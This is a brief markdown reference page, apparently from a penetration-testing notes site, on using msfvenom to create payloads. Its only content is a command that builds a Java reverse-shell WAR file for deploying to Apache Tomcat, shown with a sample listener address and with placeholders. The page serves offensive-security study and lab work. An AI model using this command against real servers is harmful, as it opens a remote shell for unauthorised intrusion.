---
title: "MSFVenom"
description: "MSFVenom"
lead: "MSFVenom"
date: 2020-11-12T15:22:20+01:00
lastmod: 2020-11-12T15:22:20+01:00
draft: false
images: []
menu: 
  docs:
    parent: "tools"
weight: 620
toc: true
---

## Creating Payloads 

### WAR File for Apache Tomcat 

{{< btn-copy text="msfvenom -p java/shell_reverse_tcp lhost=10.10.14.13 lport=4443 -f war -o pwn.war" >}}

```bash
msfvenom -p java/shell_reverse_tcp lhost=[host] lport=[port] -f war -o pwn.war
```
